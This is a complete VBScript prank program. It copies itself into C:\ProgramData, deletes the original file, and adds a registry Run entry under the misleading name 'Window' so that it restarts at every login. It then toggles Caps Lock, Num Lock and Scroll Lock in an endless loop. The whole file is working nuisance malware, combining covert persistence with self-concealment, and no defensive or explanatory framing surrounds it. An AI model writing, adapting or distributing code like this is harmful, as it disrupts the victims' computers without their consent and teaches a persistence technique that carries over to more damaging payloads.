Dim cpath, rpath, fname
'Set path and name
fname = "dancing_nums.vbs"
cpath = "C:\ProgramData\"
rpath = "C:\ProgramData\dancing_nums.vbs"
Set wshell = CreateObject ("WScript.Shell")
'Copy and delete file
Set fso = CreateObject("Scripting.FileSystemObject") 
Set obf = fso.GetFile(fname)
obf.Copy cpath, True
obf.Delete
'Use autorun on start system
wshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Window",rpath
'Use loop for dancing nums
do
WScript.Sleep 100
wshell.sendkeys "{CAPSLOCK}"
wshell.sendkeys "{NUMLOCK}"
wshell.sendkeys "{SCROLLLOCK}"
loop